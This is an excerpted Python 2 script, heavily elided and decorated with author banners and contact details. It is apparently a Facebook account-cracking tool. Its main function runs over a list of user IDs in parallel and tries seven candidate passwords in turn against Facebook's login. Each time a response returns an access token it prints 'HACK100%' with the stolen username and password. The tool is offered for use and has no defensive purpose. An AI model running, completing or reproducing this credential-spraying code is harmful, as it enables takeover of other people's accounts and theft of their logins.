#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To ArbabAliMemon
...
logo = """
  ...
  \033[1;96m:▒▒▒▒▒▒\033[1;93m+923003023263\033[1;96m▒▒▒▒▒▒▒▒▒▒▒:::::\033[1;92m♡
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Investigator-\033[1;95m♡╭────•◈•───╮♡
\033[1;92m....................FB-KA-PAPA......................
\033[1;96m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;96m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   version 1.0827
\033[1;96m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mArbab-Memon\033[1;95m♡╰─────•◈•────╯♡"""
...
print  """
 ...
 \033[1;95m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;95m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To Hackerzone▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mArbabMemon\033[1;95m♡╭───•◈•───╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91mArbabMemon
\033[1;94mArbab\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91mArbabMemon
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923003023263
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mFast-Rider\033[1;95m♡╰───•◈•───╯♡"""
jalan('              \033[1;96m............LoveYou.....................:')
jalan("\033[1;91m   ┈┈┈◢▇◣◢▇◣┈┈◢▇◣◢▇◣┈┈◢▇◣◢▇◣┈┈┈┈  ")
jalan('\033[1;91m   ┈┈┈▇▇▇▇▇▇┈┈▇▇▇▇▇▇┈┈▇▇▇▇▇▇┈┈┈┈   ')
jalan('\033[1;91m   ┈┈┈◥▇▇▇▇◤┈┈◥▇▇▇▇◤┈┈◥▇▇▇▇◤┈┈┈┈   ')
jalan("\033[1;91m   ┈┈┈┈◥▇▇◤┈┈┈┈◥▇▇◤┈┈┈┈◥▇▇◤┈┈┈┈┈ ")
...
print "\033[1;91m♡───────────♡\033[1;96mLogin Arbab\033[1;95m♡──•◈•───╯♡"
...
def pilih_super():
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mHACK100%🧨\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
	...
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mArbabMemon\033[1;95m♡───•◈•───────♡"
	print "  \033[1;93m«---•◈•---Developed By ArbabMemon---•◈•---»" #Dev:Arbab
	...
	print """
            ...
            ╚════════════════╝
♡──────────────•◈•──────────────♡.
: \033[1;96m .....CyberHacker  ArbabMemon1.9........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +923003023263"""
